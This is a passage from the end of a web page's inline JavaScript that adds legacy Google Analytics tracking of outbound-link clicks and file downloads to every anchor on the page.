var ga_file_regexp = new RegExp("\\.(?:phps|inc|js|css|exe|com|dll|reg|jpg|jpeg|gif|png|zip|tar\.gz|tgz|mp3|wav|mpeg|avi|mov|swf|pdf|doc|rtf|xls|txt|csv)(?:\\?.*)?$", "i");

// automatically track relevant anchors
function ga_track_anchor()
{
	var url = new String(this.href);
	url = url.replace(new RegExp("#.*$"), '');
	
	if ( !url.match(ga_base_url_regexp) )
	{
		url = url.replace(new RegExp("^.+?://(www\\.)?", "i"), '/');
		url = "/outbound" + url;
		//alert(url);
		pageTracker._trackPageview(url);
	}
	else if ( url.match(ga_file_regexp) )
	{
		url = url.replace(ga_base_url_regexp, '');
		url = '/file' + url;
		//alert(url);
		pageTracker._trackPageview(url);
	}
}

// add the above method to every anchor
for ( i = 0; i < document.getElementsByTagName("a").length; i++ )
{
	document.getElementsByTagName("a")[i].ga_track = ga_track_anchor;
	
	var oldonclick = document.getElementsByTagName("a")[i].onclick;	
	if ( typeof document.getElementsByTagName("a")[i].onclick == 'function' )
	{
		document.getElementsByTagName("a")[i].onclick = function() { 
			oldonclick(); 
			this.ga_track(); 
		}
	}
	else
	{
		document.getElementsByTagName("a")[i].onclick = function() { 
			this.ga_track(); 
		}
	}	
}

</script>
</body>
</html>
